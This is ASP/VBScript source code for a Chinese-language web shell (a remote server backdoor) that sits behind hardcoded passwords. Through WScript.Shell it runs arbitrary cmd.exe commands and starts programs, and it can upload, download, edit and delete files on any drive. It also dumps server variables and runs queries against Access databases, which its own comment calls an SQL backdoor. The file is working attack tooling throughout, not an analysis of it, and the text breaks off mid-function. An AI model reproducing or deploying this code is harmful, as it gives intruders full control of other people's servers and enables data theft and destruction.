<%@ LANGUAGE="VBSCRIPT" codepage="936"%>
<%'密码第一个是hjzfasp,密码是lpasp,fso密码是haiyangtop.126.com,查找替换这三个单词就可以改成别的密码了%>
<%Public resultmessage  
Response.Expires=0
Co=Request.ServerVariables("SCRIPT_NAME")
if session("hjzf_opt")="lanpingok" then
Session(Co)=0
%>
<title>::Newhjzf版---幻境之风修改::</title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<style>
body{font-family: 宋体;   font-size: 10pt}
table{ font-family: 宋体; font-size: 9pt }
a{ font-family: 宋体; font-size: 9pt; color: #000000; text-decoration: none }
a:hover{ font-family: 宋体; color: #807123; text-decoration: none }
input {	BORDER-RIGHT: #888888 1px solid; BORDER-TOP: #888888 1px solid; BACKGROUND: #ffffff; BORDER-LEFT: #888888 1px solid; BORDER-BOTTOM: #888888 1px solid; FONT-FAMILY: "Verdana", "Arial"font-color: #ffffff;FONT-SIZE: 9pt;
</style>
<SCRIPT language=javascript1.2>
function showsubmenu(sid)
{
var obj1= "ss" + sid
whichEl = eval("submenu" + sid);
if (whichEl.style.display == "none")
{
eval("submenu" + sid + ".style.display=\"\";");

}
else
{
eval("submenu" + sid + ".style.display=\"none\";");

}
}
</SCRIPT>
<%select case request("action")
	case "执行程序"
		result=ExecuteFile(request("runfilename"))
    case "删除文件"
      result=DeleteFile(request("delfilename"))
 end select
function DeleteFile(fileDel)
set fso=CreateObject("Scripting.FileSystemObject")
    on error resume next 
       ifok=cstr(fso.FileExists(fileDel))
    if fso.FileExists(fileDel) then        
       fso.DeleteFile fileDel,true
    end if
    if err>0 then 
       err.clear
       DeleteFile=false
    else 
       DeleteFile=true
    end if
  if  ifok="true" and cstr(fso.FileExists(fileDel))="false" then
      resultmessage="文件删除 (" & fileDel & ")=true"
  else
      resultmessage="文件删除 (" & fileDel & ")=false"
  end if
end function
function ExecuteFile(fileExe)
    set WSHShell=CreateObject("WScript.Shell")
	RetCode = WShShell.Run(fileExe, 0, False)
	if RetCode = 0 Then
		ExecuteFile=True
	else
    	ExecuteFile=False
	end if
resultmessage = "Run&nbsp"&"&nbsp"&fileexe&"&nbsp"&executefile
end function
if request("up")=1 then
Server.ScriptTimeOut=3000
%>
<SCRIPT RUNAT=SERVER LANGUAGE=VBSCRIPT>
dim zh
Class zha
dim Form,File
Private Sub Class_Initialize
dim aa,zhan,hh,iEnd,cc,zhang,iFormEnd,theFile
dim strDiv,zz,ee,mFileName,mFileSize,mFilePath,iDivLen,mStr
if Request.TotalBytes<1 then Exit Sub
set Form=CreateObject("Scripting.Dictionary")
set File=CreateObject("Scripting.Dictionary")
set zh=CreateObject("Adodb.Stream")
zh.mode=3
zh.type=1
zh.open
zh.write Request.BinaryRead(Request.TotalBytes)
cc=Chr(13)&Chr(10)
iDivLen=inString(1,cc)+1
strDiv=subString(1,iDivLen)
zhang=iDivLen
iFormEnd=inString(zhang,strDiv)-1
while zhang < iFormEnd
aa=inString(zhang,"name=""")
iEnd=inString(aa+6,"""")
zz=subString(aa+6,iEnd-aa-6)
zhan=inString(iEnd+1,"filename=""")
if zhan>0 and zhan<iFormEnd then
hh=inString(zhan+10,"""")
mFileName=subString(zhan+10,hh-zhan-10)
aa=inString(hh+1,cc&cc)
iEnd=inString(aa+4,cc&strDiv)
if iEnd>aa then
mFileSize=iEnd-aa-4
else
mFileSize=0
end if
set theFile=new FileInfo
theFile.FileName=getFileName(mFileName)
theFile.FilePath=getFilePath(mFileName)
theFile.FileSize=mFileSize
theFile.FileStart=aa+4
theFile.FormName=FormName
file.add zz,theFile
else
aa=inString(iEnd+1,cc&cc)
iEnd=inString(aa+4,cc&strDiv)
if iEnd>aa then
ee=subString(aa+4,iEnd-aa-4)
else
ee="" 
end if
form.Add zz,ee
end if
zhang=iformEnd+iDivLen
iFormEnd=inString(zhang,strDiv)-1
wend
End Sub
Private Function subString(theStart,theLen)
dim i,c,stemp
zh.Position=theStart-1
stemp=""
for i=1 to theLen
if zh.EOS then Exit for
c=ascB(zh.Read(1))
If c > 127 Then
if zh.EOS then Exit for
stemp=stemp&Chr(AscW(ChrB(AscB(zh.Read(1)))&ChrB(c)))
i=i+1
else
stemp=stemp&Chr(c)
End If
Next
subString=stemp
End function
Private Function inString(theStart,varStr)
dim i,j,bt,theLen,str
InString=0
Str=toByte(varStr)
theLen=LenB(Str)
for i=theStart to zh.Size-theLen
if i>zh.size then exit Function
zh.Position=i-1
if AscB(zh.Read(1))=AscB(midB(Str,1)) then
InString=i
for j=2 to theLen
if zh.EOS then 
inString=0
Exit for
end if
if AscB(zh.Read(1))<>AscB(MidB(Str,j,1)) then
InString=0
Exit For
end if
next
if InString<>0 then Exit Function
end if
next
End Function
Private Sub Class_Terminate  
form.RemoveAll
file.RemoveAll
set form=nothing
set file=nothing
zh.close
set zh=nothing
End Sub
Private function GetFilePath(FullPath)
If FullPath <> "" Then
GetFilePath = left(FullPath,InStrRev(FullPath, "\"))
Else
GetFilePath = ""
End If
End function
Private function GetFileName(FullPath)
If FullPath <> "" Then
GetFileName = mid(FullPath,InStrRev(FullPath, "\")+1)
Else
GetFileName = ""
End If
End function
Private function toByte(Str)
dim i,iCode,c,iLow,iHigh
toByte=""
For i=1 To Len(Str)
c=mid(Str,i,1)
iCode =Asc(c)
If iCode<0 Then iCode = iCode + 65535
If iCode>255 Then
iLow = Left(Hex(Asc(c)),2)
iHigh =Right(Hex(Asc(c)),2)
toByte = toByte & chrB("&H"&iLow) & chrB("&H"&iHigh)
Else
toByte = toByte & chrB(AscB(c))
End If
Next
End function
End Class
Class FileInfo
dim FormName,FileName,FilePath,FileSize,FileStart
Private Sub Class_Initialize 
FileName = ""
FilePath = ""
FileSize = 0
FileStart= 0
FormName = ""
End Sub
Public function SaveAs(FullPath)
dim dr
set dr=CreateObject("Adodb.Stream")
dr.Mode=3
dr.Type=1
dr.Open
zh.position=FileStart-1
zh.copyto dr,FileSize
dr.SaveToFile FullPath,2
dr.Close
set dr=nothing 
end function
End Class
</SCRIPT>
<%
sub foldsql()%>
<div align="center">
<table><tr><td>
<form method="POST" action="<%=Co%>">
复制文件夹:&nbsp<input type=text name=text1 size=35> 目的路径:<input type=text name=text2 size=40><br> 
移动文件夹:&nbsp<input type=text name=text3 size=35> 目的路径:<input type=text name=text4 size=40><br> 
执行&nbsp;&nbsp;程序:&nbsp<input type=text name=text5 size=35 > DOS 命令:<input type="text" name="ok" size="40"><br>  
浏览文件夹:&nbsp<input type=text name=text size=35> <%if session("password")<>"lpfsook"  then%>fsoPASS：<input type="password" name="password" size=12> <%else%>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<%=timer%>&nbsp;<%end if%> <input type=submit name=sb value=发送命令>&nbsp;<input type=submit name=Submit value=服務端变量> 
</form></td></tr></table>
<table border=1 width="720" bordercolor="#C0C0C0" cellspacing="0" cellpadding="0" bordercolorlight="#FFFFFF">
   <form  action="<%=url%>"  method="GET">
  <tr><td align="center">&nbsp;SQL字符串:<Input TYPE="TEXT" NAME="SQL" value="<%=strSQL%>" size ="104"></td></tr>
  <tr><td align="center">&nbsp;&nbsp;数 据 库:<Input TYPE="TEXT" NAME="mdb" value="acess数据库相对目录及名称" size ="30">&nbsp;密码：<Input NAME="PWD" size ="20">&nbsp;<input TYPE="SUBMIT" value="DOSQL"></td></form></tr>
</table></div> 
<hr>  
</center>
<% 
Dim strSQL, objDBConn, objRS, intFieldCount, intCounter,mdb
mdb = Request.QueryString("mdb")
strSQL = Request.QueryString("SQL")
PWD = Request.QueryString("PWD")
If strSQL <> "" and left(trim(strsql),6)="select" Then
   dosql=1
   Response.Write "SQL字符串: " & strSQL & "<br>" 
   Set objDBConn = Server.CreateObject("ADODB.Connection")
   objDBConn.Open "DRIVER={Microsoft Access Driver (*.mdb)}; DBQ=" & Server.MapPath(mdb)&";pwd=" & PWD   ' 执行SQL的数据库查询
   Set objRS = objDBconn.Execute(strSQL)
end if
if dosql=1 then
   intFieldCount = objRS.Fields.Count - 1
   If Not objRS.Eof Then
      Response.Write "<table border=1><tr>"   
      For intCounter = 0 to intFieldCount
          Response.Write "<td><b>" & objRS(intCounter).Name & "</b></td>"
      Next
      Response.Write "</tr>"
      Do While Not objRS.Eof
         Response.Write "<tr>"
         For intCounter = 0 to intFieldCount
             If objRS.Fields(intCounter).Value <> "" Then
                Response.Write "<td valign=""top"">" & objRS.Fields(intCounter).Value & "</td>"
             Else
                Response.Write "<td valign=""top"">---</td>"
             End If
         Next
         Response.Write "</tr>"
         objRS.MoveNext
      Loop
      Response.Write "</table>"
   Else
      Response.Write "<b>没有符合条件的记录</b><br>" 
   End If

   objRS.Close
   Set objRS = Nothing
   objDBConn.Close
   Set objDBConn = Nothing
end if
if strSQL <> "" and left(trim(strsql),6)<>"select" Then
%>
<script>javascript:alert("这不是select命令\n请打开数据库看运行结果\n这个你可以当做一个access版sql后门:-)")</script>
<%
end if
set WSHShell=CreateObject("WScript.Shell")
set shellapply=server.createobject("shell.application")
set fso=CreateObject("Scripting.FileSystemObject")
On Error Resume Next
hz = Request.Form("ok")
If (hz <> "") Then
szTempFile = "C:\" & fso.GetTempName( )
call WSHShell.Run ("%COMSPEC% /c " & hz & " > " & szTempFile, 0, True)
call ConverFile(szTempFile,hz)
call DeleteFile(szTempFile)
end if
check = Request.Form("Submit")
if check <>"" then
response.write "<p align=center>服務器端所有变量</p>"
for each name in request.servervariables
response.write "<br><b>"&name&"</br>"
response.write request.servervariables(name)
response.write "<HR>"
next
end if
szCMD = Request.Form("text") '浏览
if (szCMD <> "") then
if right(szCMD,1)<>"\" then szCMD=szCMD&"\"
set fod1=shellapply.namespace(szcmd)
set foditems=fod1.items
for each co in foditems
response.write ""&co.path&"-----"&co.size&"<br>"
next
response.write "<font color=#FF0000'>The command have been done!</font>"
end if
szCMD1 = Request.Form("text1") '拷贝
szCMD2 = Request.Form("text2")
if szcmd1<>"" and szcmd2<>"" then
set fod1=shellapply.namespace(szcmd2)
for i=len(szcmd1) to 1 step -1
if mid(szcmd1,i,1)="\" then
path=left(szcmd1,i-1)
exit for
end if
next
if len(path)=2 then path=path & "\"
path2=right(szcmd1,len(szcmd1)-i)
set fod2=shellapply.namespace(path)
set foditem=fod2.parsename(path2)
fod1.copyhere foditem
response.write "<font color=#FF0000'>The command have been done!</font>"
end if
szCMD3 = Request.Form("text3") '移动
szCMD4 = Request.Form("text4")
if szcmd3<>"" and szcmd4<>"" then
set fod1=shellapply.namespace(szcmd4)
	for i=len(szcmd3) to 1 step -1
if mid(szcmd3,i,1)="\" then
path=left(szcmd3,i-1)
exit for
end if
	next
if len(path)=2 then path=path & "\"
path2=right(szcmd3,len(szcmd3)-i)
set fod2=shellapply.namespace(path)
set foditem=fod2.parsename(path2)
fod1.movehere foditem
response.write "<font color=#FF0000>The command ('"&szCMD3&"' move to '"&szCMD4&"')have been done!</font>"
end if
szCMD5 = Request.Form("text5") '执行指定路径程序
if szcmd5<>"" then
  if fso.FileExists(szcmd5) then
szcmd51=left(szCMD5,InstrRev(szCMD5,"\"))
szcmd61=Right(szcmd5,len(szcmd5)-InstrRev(szCMD5,"\"))
set shellapply=server.createobject("shell.application")
shellapply.namespace(szcmd51).items.item(szcmd61).invokeverb
response.Write "<font color=#FF0000'>命令 "&szcmd5&" have done!但并不知道是否运行成功！</font>"
else
response.Write "<font color=#FF0000'>The file ("&szcmd5&") don't exist!</font>"
end if
end if
end sub
'#######################把文件用HTML语言表示出来的函数########################
sub ConverFile(thetxt,thecmd)
set fso=CreateObject("Scripting.FileSystemObject")
if fso.FileExists(thetxt) then
   resultmessage="true"
   set source=fso.OpenTextFile(thetxt)
do until source.atEndOfStream
   char = asc(source.Read(1))
   select case char
case 132: '1/8
         charnew=chr(228)
case 142: '.
         charnew=chr(196)
case 60: '<
         charnew="["
case 62: '>
         charnew="]"
case 13: 'CR
         charnew="<BR>"
case 32: 'Space
         charnew="&nbsp"
case else: 
         charnew=chr(char)
end select
response.Write charnew
loop
source.close
response.Write "<font color=#FF0000'>呵呵！恭喜，命令（"&thecmd&"）执行成功！</font>"
else
resultmessage="<font color=#FF0000'>命令可能执行失败！</font>"
response.Write resultmessage
end if
end sub
'#######################把文件用HTML语言表示出来的函数结束########################
%>
<%
dim upload,file,formName,formPath,filename
set upload=new zha
formPath=upload.form("fh")
if right(formPath,1)<>"\" then formPath=formPath&"\"
for each formName in upload.file
set file=upload.file(formName)
if file.filesize<1 then
Response.Write "NO file selected<a href=# onclick=history.go(-1)>[RE]</a>"
response.end
end if
file.SaveAs (formPath&file.FileName)
Response.write " up："&formPath&file.FileName&" OK!"
set file=nothing
next
set upload=nothing
response.write "<a href=# onclick=history.go(-1)>[RE]</a>"
response.end
else
if trim(request.form("password"))<>"" and trim(request.form("password"))<>"haiyangtop.126.com" then call out()
				'   ↓修改FSO密码
if trim(request.form("password"))="haiyangtop.126.com" then
session("password")="lpfsook"
response.redirect ""&Co&""
else if session("password")<>"lpfsook" then
call login()
response.end
end if
select case request("id")
case "edit"
call edit()
case "dir"
call dir()
case "down"
call downloadFile(request("path"))
case "out"
call out()
case else
call main()
end select
end if

sub login()
for i=0 to 25
on error resume next
IsObj=false
VerObj=""
dim TestObj
set TestObj=server.CreateObject(ObjTotest(i,0))
If -2147221005 <> Err then
IsObj = True
VerObj = TestObj.version
if VerObj="" or isnull(VerObj) then VerObj=TestObj.about
end if
ObjTotest(i,2)=IsObj
ObjTotest(i,3)=VerObj
next
%>
<body><center>
<table border=1 width=600 cellspacing=0 cellpadding=0 bordercolorlight="#C0C0C0" bordercolordark="#FFFFFF">
<tr bgcolor="#EEEEEE" height=18>
<td width="30%">&nbsp;服务器名</td>
<td width="70%">&nbsp;<a href="http://<%=Request.ServerVariables("SERVER_NAME")%>"target=_blank><%=Request.ServerVariables("SERVER_NAME")%></a></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td>&nbsp;服务器IP : 端口</td>
<td>&nbsp;<%=Request.ServerVariables("LOCAL_ADDR")%>&nbsp;:&nbsp;<font color=red><%=Request.ServerVariables("SERVER_PORT")%></font></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td>&nbsp;服务器时间</td>
<td>&nbsp;<%=now%></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td>&nbsp;服务器CPU数量 {操作系统}</td>
<td>&nbsp;<%=Request.ServerVariables("NUMBER_OF_PROCESSORS")%> 个&nbsp;{<%=Request.ServerVariables("OS")%>}</td>
</tr>
<tr bgcolor="#EEEEEE" height=18>
<td><font class=fonts>&nbsp;局域网地址:</font></td>
<%Set tN = Server.CreateObject("WSCRIPT.NETWORK")%>
<td>&nbsp;<%= "\\" & tN.ComputerName & "\" & tN.UserName%></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<%
dim t1,t2,ys,thetime
t1=timer
for i=1 to 500000
ys= 1 + 1
next
t2=timer
thetime=cstr(int(((t2-t1)*10000)+0.5)/10)
%>
<td>&nbsp;服务器运算速度&nbsp;</td>
<td>&nbsp;<%=thetime%> 毫秒 &nbsp;(256M2.4G为156.3毫秒)</td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td>&nbsp;<font color=red>客户端IP:&nbsp;端口&nbsp;[代理前]</font></td>
<td>&nbsp;<font color=red><%=Request.ServerVariables("REMOTE_ADDR")%>&nbsp;:&nbsp;<%=Request.ServerVariables("REMOTE_PORT")%>&nbsp;[&nbsp;<%=Request.ServerVariables("HTTP_X_FORWARDED_FOR")%>]</font></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td>&nbsp;本文件</td>
<td>&nbsp;<%=server.mappath(Co)%></td>
</tr>
<TR><TD colspan="4" bgcolor="#ffffff" >
<form name="form" method="post" action="<%=Co%>?up=1" enctype="multipart/form-data">
&nbsp;绝对路径:<input type="text" name="fh" value="<%=Server.MapPath(".")%>"size=86><BR>
&nbsp;文件:<input type="file" name="f1"size=72> <input type="submit" name="upup" value="上传">
</TD></TR></form></table><br>
<body><%call foldsql()%></body>
<%end sub
sub main()
dim cpath,lpath
set fsoBrowse=CreateObject("Scripting.FileSystemObject")
if Request("path")="" then
lpath="/"
else
lpath=Request("path")&"/"
end if
if Request("attrib")="true" then
cpath=lpath
attrib="true"
else
cpath=Server.MapPath(lpath)
attrib=""
end if
%>
<script language="JavaScript">
function crfile(ls)
{
if (ls==""){alert("请输入文件名!");}
else {window.open("<%=Co%>?id=edit&attrib=<%=request("attrib")%>&creat=yes&path=<%=lpath%>"+ls);}
return false;
}
function crdir(ls)
{
if (ls==""){alert("输入文件名!");}
else {window.open("<%=Co%>?id=dir&attrib=<%=request("attrib")%>&op=creat&path=<%=lpath%>"+ls);}
return false;
}
</script>
<script language="vbscript">
sub rmdir(ls)
if confirm("你真的要删除这个目录吗!"&Chr(13)&Chr(10)&"目录为："&ls) then
window.open("<%=Co%>?id=dir&path="&ls&"&op=del&attrib=<%=request("attrib")%>")
end if
end sub
sub copyfile(sfile)
dfile=InputBox(""&Chr(13)&Chr(10)&"源文件："&sfile&Chr(13)&Chr(10)&"请输入目标文件的文件名:"&Chr(13)&Chr(10)&"许带路径,要根据你的当前路径模式. 注意:绝对路径示例c:/或c:\都可以")
dfile=trim(dfile)
attrib="<%=request("attrib")%>"
if dfile<>"" then
if InStr(dfile,":") or InStr(dfile,"/")=1 then
lp=""
if InStr(dfile,":") and attrib<>"true" then
alert "在相对路径模式下不能使用绝对路径"&Chr(13)&Chr(10)&"错误路径：["&dfile&"]"
exit sub
end if
else
lp="<%=lpath%>"
end if
window.open("<%=Co%>?id=edit&path="+sfile+"&op=copy&attrib="+attrib+"&dpath="+lp+dfile)
else
alert"输入文件名！"
end If
end sub
</script>
<body bgcolor="#F5F5F5">
<TABLE cellSpacing=1 cellPadding=3 width="750" align=center bgColor=#b8b8b8 border=0>
<TBODY>
<tr bgcolor="#F5F5F5">
<td height=22 colspan="4" bgcolor="#eeeeee"><a href=<%=Co%>?id=out><font color='#D00000'>〖退出〗</font></a>
本文件: <%=server.mappath(Co)%> (物理)路径 <%=Request.ServerVariables("APPL_PHYSICAL_PATH")%>
</td>
</tr>
<TR ><TD height=22 colspan="4" bgcolor="#eeeeee">切换盘符：
<%For Each thing in fsoBrowse.Drives
Response.write "<a href='"&Co&"?path="&thing.DriveLetter&":&attrib=true'>"&thing.DriveLetter&"盘:</a>&nbsp;"
NEXT%>   &nbsp;局域网地址：
<%Set tN = Server.CreateObject("WSCRIPT.NETWORK")%>
<%= "\\" & tN.ComputerName & "\" & tN.UserName %></TD>
</TR><TD colspan="4" bgcolor="#ffffff" >
<%if Request("attrib")="true" then
response.write "<a href='"&Co&"'><font color='#D00000'>换到相对路径模式</font></a>〖绝对"
else
response.write "<a href='"&Co&"?attrib=true'><font color='#D00000'>换到绝对路径模式</font></a>〖相对"
end if
%>路径〗<%=cpath%>  &nbsp;&nbsp;当前浏览目录:<%=lpath%></TD></TR>
<TR><TD height=22 colspan="4" bgcolor="#eeeeee">
<form name="form1" method="post" action="<%=Co%>">
浏览目录: <input type="text" name="path" size="66" value="c:">
<input type="hidden" name="attrib" value="true">
<input type="submit" name="Submit" value="浏览目录"> 〖绝对路径,支持局域网地址！〗
</TD></form></TR>

<TR><TD colspan="4" bgcolor="#ffffff" >
<form name="form" method="post" action="<%=Co%>?up=1" enctype="multipart/form-data">
〖用绝对路径〗传至服务器已有目录:
<input type="text" name="fh" value="<%=Server.MapPath(".")%>"size="40">
文件:<input type="file" name="f1"> <input type="submit" name="Submit" value="上传">
</TD></form></TR>

<TR bgcolor="#eeeeee">
<TD colspan="4" >
<%
On Error Resume Next
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD7 = Request.Form(".CMD")
If (szCMD7 <> "") Then
szTempFile = "C:\" & fso.GetTempName( )
Call WSHShell.Run ("%COMSPEC% /c " & szCMD7 & " > " & szTempFile, 0, True)
Call ConverFile(szTempFile)
call DeleteFile(szTempFile)
end if
%>
<FORM action="<%= Request.ServerVariables("URL") %>" method="GET" name="userdata">
<input type=text name='runfilename' size=25>&nbsp;<input type='submit' name=action value="执行程序">
<input type=text name='delfilename' size=25>&nbsp;<input type='submit' name=action value="删除文件">〖请使用绝对路径，并且确定你有相应权限！〗
</TD></FORM></TR>

<TR bgColor=#eeeeee><TD height=22 colspan="4" >
<form name="newfile" onSubmit="return crfile(newfile.filename.value);">
〖<%=cpath%>〗
<input type="text" name="filename" size="40">
<input type="submit" value="建文件" >
<input type="button" value="建目录"onclick="crdir(newfile.filename.value)">〖新建文件和新建目录不能同名〗
</TD></form></TR>
  <tr id=menuTitle1 onclick="showsubmenu(1)" style="cursor: hand"> 
    <td  height=25 colspan="4" valign="middle" onmouseover=this.className='menu_title2'; onmouseout=this.className='menu_title'; > 
      <span>点击这里隐藏或显示文件夹动作与执行SQL语句框</span>&nbsp;&nbsp; <font color="#FF0000"><%=resultmessage%></font></td>
  </tr>
  <tr> 
    <td colspan="4" style="display:none" id='submenu1'><%call foldsql()%></td>
  </tr>
<TR bgColor=#dddddd>
<TD height=22 width="26%" rowspan="2" valign="top" bgColor=#eeeeee >
<%
dim theFolder,theSubFolders
if fsoBrowse.FolderExists(cpath)then
Set theFolder=fsoBrowse.GetFolder(cpath)
Set theSubFolders=theFolder.SubFolders
Response.write"<a href='"&Co&"?path="&Request("oldpath")&"&attrib="&attrib&"'><font color='#FF8000'>■</font>↑<font color='ff2222'>上级目录</font></a><br>"
For Each x In theSubFolders
Response.write"<a href='"&Co&"?path="&lpath&x.Name&"&oldpath="&Request("path")&"&attrib="&attrib&"'>└<font color='#FF8000'>■</font>  "&x.Name&"</a> <a href="&chr(34)&"javascript: rmdir('"&lpath&x.Name&"')"&chr(34)&"><font color='#FF8000' >×</font>删除</a><br>"
Next
end if
%>
</TD>
<TD width="44%">文件名 （鼠标移到文件名可以查看文件属性）</TD>
<TD width="11%">大小（字节）</TD>
<TD width="18%">文件操作</TD>
</TR>
<TR><TD height=200 colspan="3" valign="top" bgColor=#ffffff>
<%
dim theFiles
if fsoBrowse.FolderExists(cpath)then
Set theFolder=fsoBrowse.GetFolder(cpath)
Set theFiles=theFolder.Files
Response.write"<table  width='100%' border='0' cellspacing='0' cellpadding='2'>"
For Each x In theFiles
if Request("attrib")="true" then
showstring="<a title='"&"类型"&x.type&chr(10)&"属性"&x.Attributes&chr(10)&"时间："&x.DateLastModified&"'target='_blank'><strong>"&x.Name&"</strong></a>"
else
showstring="<a href='"&lpath&x.Name&"' title='"&"类型"&x.type&chr(10)&"属性"&x.Attributes&chr(10)&"时间："&x.DateLastModified&"'target='_blank'><strong>"&x.Name&"</strong></a>"
end if
	Response.write"<tr onmouseover=this.style.backgroundColor='#C1D6FF' onmouseout=this.style.backgroundColor=''><td width='50%' style='border-bottom:1 solid #000000;' onmouseover=this.style.backgroundColor='#C1D6FF' onmouseout=this.style.backgroundColor=''>"&_
	"<font color='#FF8000'>□</font>"&showstring&"</td><td width='8%' style='border-bottom:1 solid #000000;'>"&_
	""&x.size&"</a></td><td width='20%' style='border-bottom:1 solid #000000;'>&nbsp;"&_
	"<a href='"&Co&"?id=edit&path="&lpath&x.Name&"&attrib="&attrib&"' target='_blank'>编辑</a>&nbsp;"&_
	"<a href='#' onclick=copyfile('"&lpath&x.Name&"')>复制</a>&nbsp"&_
	"<a href='"&Co&"?id=edit&path="&lpath&x.Name&"&op=del&attrib="&attrib&"' target='_blank'>删除</a>&nbsp;"&_
	"<a href='"&Co&"?id=down&path="&lpath&x.Name&"&attrib="&attrib&"' target='_blank'>下载</a>&nbsp;</td></tr>"

Next
end if
Response.write"</table>"
%>
</TD></TR></TBODY></TABLE>
<%end sub
sub edit()
if request("op")="del" then
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
Set thisfile = fs.GetFile(whichfile)
thisfile.Delete True
Response.write "<br><center>删除成功！要刷新才能看到效果.</center>"
else
if request("op")="copy" then
if Request("attrib")="true" then
whichfile=Request("path")
dsfile=Request("dpath")
else
whichfile=server.mappath(Request("path"))
dsfile=Server.MapPath(Request("dpath"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
Set thisfile = fs.GetFile(whichfile)
thisfile.copy dsfile
Response.write "<center><p>源文件："+whichfile+"</center>"
Response.write "<center><br>目的文件："+dsfile+"</center>"
Response.write "<center><br>复制成功！刷新看效果!</p></center>"
else
if request.form("text")="" then
if Request("creat")<>"yes" then
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
Set thisfile = fs.OpenTextFile(whichfile, 1, False)
counter=0
thisline=thisfile.readall
thisfile.Close
set fs=nothing
end if
%>
<SCRIPT language=JavaScript>
<!--
var i=0;
var ie=(document.all)?1:0;
var ns=(document.layers)?1:0;
function selectCode()
{
if(document.pad.text.value.length>0)
{
document.pad.text.focus();
document.pad.text.select();
}
else alert('无内容被选中!')
}
function preview()
{
if(document.pad.text.value.length>0)
{
pr=window.open("","Preview","scrollbars=1,menubar=1,status=1,width=700,height=320,left=50,top=110");
pr.document.write(document.pad.text.value);
}
else alert('无内容可供预览!')
}
function uncompile()
{
if (document.pad.text.value.length>0)
{
source=unescape(document.pad.text.value);
document.pad.text.value=""+source+"";
	i++;
	alert("代码已编译"+i+"次!");
}
else alert('请把需待解密的代码copy到此框中!')
}
// -->
</SCRIPT>
<form method="POST" name=pad action="<%=Co%>?id=edit">
<input type="hidden" name="attrib" value="<%=Request("attrib")%>"><br>
<TABLE cellSpacing=1 cellPadding=3 width="750" align=center bgColor=#b8b8b8 border=0>
<TR><TD height=22 bgcolor="#eeeeee"><div align="center">文件编辑器</div></TD></TR>
<TR ><TD width="100%" height=22 bgcolor="#ffffff">文件名：
<input type="text" name="path" size="45" value="<%=Request("path")%>"readonly></TD>
</TR>
<TR><TD bgcolor="#eeeeee">
<textarea rows="30" name="text" cols="100%"><%=thisline%></textarea></TD>
</TR>
<TR><TD height=22 bgcolor="#ffffff"><div align="center">
<input type="submit" value="提交" name="B1">
<INPUT name=select onclick=selectCode() type=button value=选中>
<INPUT name=view onclick=preview() type=button value=预览>
<INPUT name=retur onclick=uncompile() type=button value=JAVA解密>
<INPUT name=clear type=reset value=重置>
</div></TD></TR></TABLE></form>

<%else
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
Set outfile=fs.CreateTextFile(whichfile)
outfile.WriteLine Request("text")
outfile.close
set fs=nothing
Response.write "<center>修改成功！刷新就看到效果!</center>"
end if
end if
end if
end sub
end if

sub dir()
if request("op")="del" then
if Request("attrib")="true" then
whichdir=Request("path")
else
whichdir=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
fs.DeleteFolder whichdir,True
Response.write "<center> 成功！刷新看效果，删除的目录:<b>"&whichdir&"</b></center>"
else

if request("op")="creat"  then
if Request("attrib")="true" then
whichdir=Request("path")
else
whichdir=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
fs.CreateFolder whichdir
Response.write "<center> 成功！刷新看效果,新建目录:<b>"&whichdir&"</b></center>"
end if
end if
end sub

function downloadFile(strFile)
	strFilename = Request("path")
Response.Buffer = True
Response.Clear
Set s = Server.CreateObject("ADODB.Stream")
s.Open
s.Type = 1
on error resume next
Set fso = Server.CreateObject("Scripting.FileSystemObject")
if not fso.FileExists(strFilename) then strFilename = server.MapPath(strFile)
if not fso.FileExists(strFilename) then
Response.Write("<h1>出错:</h1>" & strFilename & " 有问题<p>")
Response.End
end if
Set f = fso.GetFile(strFilename)
intFilelength = f.size
s.LoadFromFile(strFilename)
if err then
Response.Write("<h1>Error: </h1>" & err.Description & "<p>")
Response.End
end if
Response.AddHeader "Content-Disposition", "attachment; filename=" & f.name
Response.AddHeader "Content-Length", intFilelength
Response.CharSet = "UTF-8"
Response.ContentType = "application/octet-stream"
Response.BinaryWrite s.Read
Response.Flush
s.Close
Set s = Nothing
response.end
End Function

function out()
Session.Abandon
response.redirect ""&Co&""
response.end
End Function
%>
<BR><CENTER><%=now%></body>
<%
else
randomize timer
regjm=int(rnd*8998)+1000
%>
<html><head><title>登录</title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<script language=javascript>
<!--
function check()
{
var mjj=document.adm
if(mjj.admid.value.length<=0)
{
	alert("输入名字!");
	mjj.admid.focus();
	return false;
}
if(mjj.admpw.value.length<=0)
{
	alert("输入密码！");
	mjj.admpw.focus();
	return false;
}
if(mjj.admrz.value.length<=0)
{
	alert("输入认证码！");
	mjj.admrz.focus();
	return false;
}
var regno1=mjj.admrz.value;
var regno2=mjj.admrz1.value;
if(regno1!=regno2)
{
	window.alert('输入正确的认证码: '+regno2+'！');
	mjj.admrz.focus();
	return false;
}
}
//-->
</script>
<%							     ' ↓改名字
if request.form("admid")<>"" and trim(request.form("admid"))<>"hjzfasp" then
response.write "<B>名字</B>错！"
end if							      ' ↓改密码
if request.form("admpw")<>"" and trim(request.form("admpw"))<>"lpasp" then
response.write "	<STRONG><font color=red>密码错！</font></STRONG>"
end if
if trim(request.form("admid"))="hjzfasp" and trim(request.form("admpw"))="lpasp" then
session("hjzf_opt")="lanpingok"
response.redirect ""&Co&""
response.end
else

Session(Co) = Session(Co) + 1
if Session(Co)=4 then
response.write "<P align='center'><INPUT onclick='JavaScript:window.close()' type='button' value='关闭'></P>"
response.end
end if
if Session(Co)>4 then
